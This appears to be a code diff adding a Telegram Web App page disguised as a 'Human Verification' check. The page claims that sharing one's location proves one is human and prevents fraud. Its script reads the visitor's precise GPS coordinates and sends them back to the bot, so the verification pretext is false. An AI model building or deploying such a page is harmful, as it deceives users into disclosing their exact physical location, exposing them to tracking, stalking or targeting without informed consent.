@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Human Verification</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f4f4f9; padding: 20px; text-align: center; }
+    h2 { color: #333; }
+    p { color: #666; max-width: 400px; line-height: 1.5; }
+    .btn { background: #0088cc; color: #fff; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px; }
+    .btn:disabled { background: #aaa; cursor: not-allowed; }
+    .status { margin-top: 15px; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h2>🛡 Human Verification</h2>
+  <p>To access the bot, please verify your location to prove you are human. This helps us stop fraudulent access.</p>
+  
+  <button id="verifyBtn" class="btn">Allow Location & Verify</button>
+  <div id="status" class="status"></div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    const btn = document.getElementById('verifyBtn');
+    const status = document.getElementById('status');
+
+    btn.addEventListener('click', () => {
+      btn.disabled = true;
+      status.innerText = "Checking location...";
+      status.style.color = "blue";
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            status.innerText = "✅ Verified successfully! Returning to bot...";
+            status.style.color = "green";
+            
+            // Send back simple JSON to bot via Web_app_data
+            setTimeout(() => {
+              tg.sendData(JSON.stringify({ lat: lat, lon: lon, verified: true }));
+              tg.close();
+            }, 1500);
+          },
+          (error) => {
+            btn.disabled = false;
+            status.innerText = "❌ Location access denied or failed. Please allow to continue.";
+            status.style.color = "red";
+          }
+        );
+      } else {
+        status.innerText = "❌ Geolocation not supported.";
+        status.style.color = "red";
+      }
+    });
+  </script>
+</body>
+</html>
